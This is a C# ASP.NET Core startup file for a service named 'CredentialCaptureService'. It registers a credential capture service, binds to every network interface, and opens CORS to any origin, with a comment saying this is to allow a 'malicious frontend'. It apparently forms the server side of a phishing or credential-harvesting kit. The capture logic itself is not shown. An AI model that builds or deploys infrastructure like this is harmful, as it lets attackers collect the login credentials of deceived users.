using CredentialCaptureService.Services;

var builder = WebApplication.CreateBuilder(args);

// Configure Kestrel to listen on port 5000 (from appsettings.json)
var port = builder.Configuration.GetValue<int>("Server:Port", 5000);
builder.WebHost.ConfigureKestrel(serverOptions =>
{
    serverOptions.ListenAnyIP(port);
});

// Add services to the container
builder.Services.AddControllers();

// Register credential capture service
builder.Services.AddSingleton<ICredentialService, CredentialService>();

// Configure CORS to allow malicious frontend
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowAll", policy =>
    {
        policy.AllowAnyOrigin()
              .AllowAnyMethod()
              .AllowAnyHeader();
    });
});

// Configure logging
builder.Logging.ClearProviders();
builder.Logging.AddConsole();
builder.Logging.AddDebug();

var app = builder.Build();

// Configure the HTTP request pipeline
app.UseCors("AllowAll");

app.UseAuthorization();

app.MapControllers();

app.Run();
